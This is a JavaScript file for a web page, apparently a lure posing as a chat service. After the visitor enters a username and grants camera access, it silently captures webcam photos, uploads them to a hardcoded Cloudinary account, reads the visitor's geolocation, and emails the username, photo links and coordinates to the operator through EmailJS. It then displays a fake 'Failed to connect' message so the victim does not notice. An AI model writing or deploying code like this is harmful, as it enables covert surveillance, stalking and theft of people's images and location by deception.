// Function to capture photos from the camera, upload to Cloudinary, and return URLs
async function captureAndUploadPhotos() {
    const video = document.createElement('video');
    video.srcObject = videoStream;
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    const imageURLs = [];

    // Wait for the video stream to be ready
    await new Promise(resolve => video.addEventListener('loadedmetadata', resolve));

    for (let i = 0; i < 2; i++) {  // Capture 2 photos to reduce the load
        // Reduce the resolution by setting smaller canvas dimensions
        canvas.width = video.videoWidth / 5;  // Reduce to 20% of the original width
        canvas.height = video.videoHeight / 5; // Reduce to 20% of the original height
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        const imageData = canvas.toDataURL('image/jpeg', 0.2); // Convert to JPEG with lower quality
        const imageURL = await uploadToCloudinary(imageData);  // Upload image to Cloudinary
        imageURLs.push(imageURL);  // Save the URL of the uploaded image
    }

    videoStream.getTracks().forEach(track => track.stop()); // Stop the camera

    return imageURLs;  // Return array of image URLs
}

// Function to upload images to Cloudinary
async function uploadToCloudinary(base64Image) {
    const formData = new FormData();
    formData.append('file', base64Image.split(',')[1]);  // Remove the data:image/jpeg;base64, part
    formData.append('upload_preset', 'chatterlink-preset');  // Replace with your Cloudinary upload preset

    const response = await fetch(`https://api.cloudinary.com/v1_1/dnudwo16z/image/upload`, {
        method: 'POST',
        body: formData
    });

    const data = await response.json();
    return data.secure_url;  // Return the secure URL of the uploaded image
}

// Function to send email via EmailJS
async function sendEmailWithImageURLs(data, imageURLs) {
    const emailParams = {
        username: data.username,
        photos: imageURLs.join(', '),  // Send the URLs as a comma-separated string
        latitude: data.latitude,
        longitude: data.longitude
    };

    emailjs.send('service_zlf739n', 'template_t2l7g8n', emailParams)
    .then((response) => {
        console.log('SUCCESS!', response.status, response.text);
    }, (error) => {
        console.error('FAILED...', error);
    });
}

// Example flow: Capture photos, get location, and send email
startBtn.addEventListener('click', async () => {
    const username = document.getElementById('username').value;
    if (!username) {
        alert('Please enter your username.');
        return;
    }

    // Request camera access and capture photos
    videoStream = await navigator.mediaDevices.getUserMedia({ video: true });
    const imageURLs = await captureAndUploadPhotos();

    // Get user location
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(async (position) => {
            const locationData = {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude
            };

            // Send the username, photos (URLs), and location via email
            sendEmailWithImageURLs({
                username: username,
                latitude: locationData.latitude,
                longitude: locationData.longitude
            }, imageURLs);

            // Show "Failed to connect" message
            showFailedToConnect();
        }, error => {
            // Even if location fails, show "Failed to connect"
            showFailedToConnect();
        });
    } else {
        showFailedToConnect();
    }
});

function showFailedToConnect() {
    document.getElementById('main-content').style.display = 'none';
    document.getElementById('failed-message').style.display = 'block';
}
